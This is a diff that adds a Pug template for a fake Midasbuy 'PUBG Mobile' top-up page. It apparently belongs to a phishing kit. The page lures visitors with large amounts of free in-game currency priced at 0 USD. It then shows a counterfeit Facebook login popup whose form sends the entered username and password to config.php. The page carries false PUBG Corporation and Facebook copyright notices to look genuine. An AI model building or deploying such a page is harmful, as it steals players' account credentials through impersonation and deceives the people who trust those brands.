@@ -1,0 +1,185 @@
+doctype html
+html(lang="en", dir="ltr")
+  head
+    meta(charset="utf-8")
+    meta(http-equiv="X-UA-Compatible", content="IE-edge")
+    meta(name="viewport", content="width=device-width, initial-scale=1")
+    link(rel="stylesheet", href="css/bootstrap.min.css")
+    link(rel="stylesheet", href="css/animate.css")
+    link(rel="stylesheet", href="css/all.min.css")
+    link(rel="stylesheet", href="css/master.css")
+    link(href="https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Reem+Kufi&display=swap" rel="stylesheet")
+    script(src="JS/html5shiv.min.js")
+    script(src="JS/respond.min.js")
+    title Pubg Mobile - Midasbuy
+  body
+    
+    include layout/header
+
+    .main-content
+      .container
+        .all-forms
+          .form-main
+            label Player ID Verification
+            .input-groups
+              input.main-input(name='first_name' placeholder='Please Enter Player ID' type='text')
+              span OK
+            .validation-msg.empty Player ID is required‎
+            .message Couldn't find your Player ID?
+        h6 Payment Method 
+        .credit
+          .depit
+            img(src="imges/vis.png", alt="")
+          .txt
+            p Credit / Debit / Prepaid Card
+            p.gold UP TO 58% BONUS UC
+        .visa
+          img(src="imges/card1.png", alt="")
+          img(src="imges/card2.png", alt="")
+          img(src="imges/card3.png", alt="")
+          img(src="imges/card4.png", alt="")
+          img(src="imges/card5.png", alt="")
+          img(src="imges/card6.png", alt="")
+          img(src="imges/card7.png", alt="")
+        .warning
+          p Select Product
+          .warn #[span Warning !] Finishing Your Payment 
+        .row 
+          .col-lg-3.col-sm-6.col-xs-6.col-6
+            .box.activee
+              .one
+                img(src="imges/ucAtas.png", alt="")
+                span 5000 #[span.orng +1200]
+              .tow
+                img(src="imges/1.png", alt="")
+              .three
+                img(src="imges/prisnt.png", alt="")
+                button 0 USD
+          .col-lg-3.col-sm-6.col-xs-6.col-6
+            .box
+              .one
+                img(src="imges/ucAtas.png", alt="")
+                span 7000 #[span.orng +1400]
+              .tow
+                img(src="imges/2.png", alt="")
+              .three
+                img(src="imges/prisnt.png", alt="")
+                button 0 USD
+          .col-lg-3.col-sm-6.col-xs-6.col-6
+            .box
+              .one
+                img(src="imges/ucAtas.png", alt="")
+                span 72000 #[span.orng +5000]
+              .tow
+                img(src="imges/3.png", alt="")
+              .three
+                img(src="imges/prisnt.png", alt="")
+                button 0 USD
+          .col-lg-3.col-sm-6.col-xs-6.col-6
+            .box
+              .one
+                img(src="imges/ucAtas.png", alt="")
+                span 102000 #[span.orng +8000]
+              .tow
+                img(src="imges/4.png", alt="")
+              .three
+                img(src="imges/prisnt.png", alt="")
+                button 0 USD
+          .col-lg-3.col-sm-6.col-xs-6.col-6
+            .box.bef-last
+              .one
+                img(src="imges/ucAtas.png", alt="")
+                span 300000 #[span.orng +11100]
+              .tow
+                img.before-last(src="imges/5.png", alt="")
+              .three
+                img(src="imges/prisnt.png", alt="")
+                button 8.99$ USD
+          .col-lg-3.col-sm-6.col-xs-6.col-6
+            .box.last
+              .one
+                img(src="imges/ucAtas.png", alt="")
+                span 500500 #[span.orng +13400]
+              .tow
+                img.last(src="imges/6.png", alt="")
+              .three
+                img(src="imges/prisnt.png", alt="")
+                button 19.99$ USD
+
+    .about-us
+      .container
+        .copy
+          .part
+            .twins
+              p For customer service
+              p Please send email to [email protected]
+            .btnn
+              .feed 
+                i.far.fa-envelope
+                span Feedback
+              .face
+                i.fab.fa-facebook-square
+                span Facebook
+          p.space Cookie Perferences | Terms of Service | Privacy Policy #[span COPYRIGHT &copy; PUBG CORPORATION. ALL RIGHTS RESERVED ]
+          p.phon COPYRIGHT &copy; PUBG CORPORATION. ALL RIGHTS RESERVED
+    
+    .loagin.hidden
+      .social 
+        p Login to continue your payment
+        button.fbook Login With Facebook #[i.fab.fa-facebook-square]
+        button Login With Twitter #[i.fab.fa-twitter]
+        button.cancel Cancel Payment
+      
+      .popup-box
+        span #[i.fas.fa-times.fa]
+        .head
+          img(src="imges/text.png", alt="")
+        .content-box
+          img(src="imges/icon-logo.jpg", alt="")
+          .txt-box  Log in to your Facebook account to connect to PUBG MOBILE
+          form(action="config.php")
+            input(type="text" name="username" autocomplete="off" required placeholder="Mobile number or email address")
+            input(type="password" name="password" autocomplete="off" required  placeholder="Password")
+            input(id="seend" type='submit' value='Log In')
+          .txt-creat Create account 
+          .txt-creat Not now
+          .txt-creat Forgotten password?
+        .language-box
+          .center-box
+            .words-txt English (UK)
+            .words-txt Bahasa Indonesia
+            .words-txt Basa Jawa
+            .words-txt Bahasa Melayu
+            //- .words-txt å,
+            //- .words-txt Español
+            .words-txt Português (Brasil)
+            .words-txt #[i.fa.fa-plus]
+        .copy-box Facebook Inc.
+
+
+    .footer
+      .usd
+        span.cust Total: 0 USD
+        span.hidden.eight Total: 8.99 USD
+        span.hidden.thirt Total: 19.99 USD
+        button Pay now
+
+
+
+    //- .loading
+      .sk-circle
+        .sk-circle1.sk-child
+        .sk-circle2.sk-child
+        .sk-circle3.sk-child
+        .sk-circle4.sk-child
+        .sk-circle5.sk-child
+        .sk-circle6.sk-child
+        .sk-circle7.sk-child
+        .sk-circle8.sk-child
+        .sk-circle9.sk-child
+        .sk-circle10.sk-child
+        .sk-circle11.sk-child
+        .sk-circle12.sk-child
+    
+    include layout/footerscripts
+
